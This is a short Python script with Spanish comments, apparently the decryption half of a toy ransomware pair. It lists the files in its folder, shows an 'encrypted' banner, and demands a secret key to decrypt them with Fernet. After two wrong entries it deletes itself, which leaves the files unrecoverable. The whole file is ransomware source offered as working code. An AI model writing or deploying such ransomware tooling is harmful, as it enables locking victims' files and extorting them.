#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Lista de archivos a descifrar
files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "secretKey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("secretKey.key", "rb") as key:
    secretKey = key.read()

print("""
                                        _              _
  ___  _ __    ___  _ __  _   _  _ __  | |_   ___   __| |
 / _ \| '_ \  / __|| '__|| | | || '_ \ | __| / _ \ / _` |
|  __/| | | || (__ | |   | |_| || |_) || |_ |  __/| (_| |
 \___||_| |_| \___||_|    \__, || .__/  \__| \___| \__,_|
                          |___/ |_|
""")

attempts = 2
while attempts > 0:
    inputKey = input("Enter the secret key to recover your files:\n")

    if inputKey == secretKey.decode():  # Decodifica la clave ingresada para compararla
        for file in files:
            with open(file, "rb") as theFile:
                content = theFile.read()
            decrypted_content = Fernet(secretKey).decrypt(content)
            with open(file, "wb") as theFile:
                theFile.write(decrypted_content)
            print("\nDecrypting....")
        break  

    else:
        attempts -= 1
        if attempts == 0:
            os.unlink("decrypt.py")
            print("(X_x)")
        else:
            print(f"[!] ERROR, YOU ONLY HAVE: {attempts} attempts left")
